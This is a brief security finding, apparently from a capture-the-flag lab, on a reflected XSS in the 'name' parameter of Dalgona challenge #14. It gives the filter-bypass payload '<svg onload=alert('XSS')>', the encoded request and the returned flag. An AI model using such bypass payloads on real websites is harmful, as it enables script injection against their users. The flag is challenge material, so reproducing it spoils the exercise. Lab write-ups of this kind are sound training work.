findings.title: Reflected XSS - Dalgona Challenge #14 Filter Bypass
findings.description: The /page endpoint reflects the 'name' GET parameter directly into the HTML response. The server filters forward slashes (/) and certain HTML tags (script, img) but does NOT filter SVG/body event handlers with space separators. Using '<svg onload=alert("XSS")>' bypasses all filters and executes JavaScript. The CTF flag was returned upon successful XSS execution.
findings.evidence:
GET /page?name=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E returned:
Congratulations!
Here is the flag: flag{ad00f199-e499-4836-b75a-7e2b7842aa59}

Payload: <svg onload=alert('XSS')>
Filter bypass: Server strips '/' so '<svg/onload=...>' becomes '<svgonload=...>' (broken). Using space '<svg onload=...>' keeps SVG element intact with event handler.
